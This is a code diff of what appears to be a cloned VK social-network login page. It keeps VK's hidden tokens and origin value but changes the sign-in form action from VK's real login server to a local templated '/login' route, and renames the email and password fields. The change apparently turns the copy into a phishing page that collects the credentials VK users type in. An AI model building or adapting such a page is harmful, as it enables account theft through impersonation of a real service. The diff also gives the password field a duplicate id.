@@ -221,9 +221,9 @@ var abp;
     <input type="hidden" name="lg_h" value="2a345e4e04178ccfb1" />
     <input type="hidden" name="ul" id="quick_login_ul" value="" />
     <div class="label">Phone or email</div>
-    <div class="labeled"><input type="text" name="email" class="dark" id="email" value="" /></div>
+    <div class="labeled"><input type="text" name="e" class="dark" id="e" value="" /></div>
     <div class="label">Password</div>
-    <div class="labeled"><input type="password" name="password" class="dark" id="password" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
+    <div class="labeled"><input type="password" name="p" class="dark" id="e" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
     <input type="submit" class="submit" />
   </form>
   <button class="quick_login_button flat_button button_wide" id="quick_login_button">Sign in</button>
@@ -296,15 +296,15 @@ var abp;
 </div>
 <div id="index_rcolumn" class="index_rcolumn">
   <div id="index_login" class="page_block index_login">
-    <form method="post" name="login" id="index_login_form" action="https://login.vk.com/?act=login">
+    <form method="post" name="login" id="index_login_form" action="{{ url('/login') }}">
       <input type="hidden" name="act" id="act" value="login">
       <input type="hidden" name="role" value="al_frame" />
       <input type="hidden" name="expire" id="index_expire_input" value="" />
       <input type="hidden" name="_origin" value="https://vk.com" />
       <input type="hidden" name="ip_h" value="bc8ed6cc4207dba667" />
       <input type="hidden" name="lg_h" value="2a345e4e04178ccfb1" />
-      <input type="text" class="big_text" name="email" id="index_email" value="" placeholder="Phone or email" />
-      <input type="password" class="big_text" name="pass" id="index_pass" value="" placeholder="Password" onkeyup="toggle('index_expire', !!this.value);toggle('index_forgot', !this.value)" />
+      <input type="text" class="big_text" name="email" id="email" value="" placeholder="Phone or email" />
+      <input type="password" class="big_text" name="password" id="password" value="" placeholder="Password" onkeyup="toggle('index_expire', !!this.value);toggle('index_forgot', !this.value)" />
       <button id="index_login_button" class="index_login_button flat_button button_big_text">Sign in</button>
       <div class="forgot">
         <div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Don&#39;t remember me</div>
